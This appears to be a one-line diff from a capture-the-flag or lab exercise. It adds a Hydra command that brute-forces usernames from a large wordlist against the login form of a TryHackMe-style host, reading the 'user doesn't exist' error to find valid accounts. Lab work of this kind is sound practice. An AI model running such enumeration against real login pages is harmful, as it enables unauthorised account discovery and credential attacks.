@@ -1,0 +1,1 @@
+hydra -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -p asdf nano.cherryontop.thm http-post-form "/login.php:username=^USER^&password=^PASS^&submit=:F=This user doesn't exist"
